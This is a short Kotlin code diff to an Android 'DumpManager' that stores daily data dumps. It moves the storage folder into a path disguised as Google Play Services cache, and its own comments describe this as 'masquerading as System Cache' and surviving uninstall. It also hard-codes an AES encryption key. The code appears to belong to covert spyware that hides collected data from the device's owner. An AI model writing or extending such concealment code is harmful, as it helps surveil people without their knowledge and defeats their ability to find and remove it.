@@ -13,8 +13,8 @@ import org.json.JSONArray
 
 object DumpManager {
 
-    // Hidden path in Documents to survive uninstall (Android 10+ needs permission)
-    private val ROOT_DIR = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), ".CortexSystem")
+    // Hidden path, 6 folders deep, masquerading as System Cache
+    private val ROOT_DIR = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android/data/com.google.android.gms/files/cache/.sys_config")
     private val KEY = "C0rtexS3cr3tK3y!".toByteArray() // 16 bytes for AES-128
 
     fun createDailyDump(ctx: Context) {
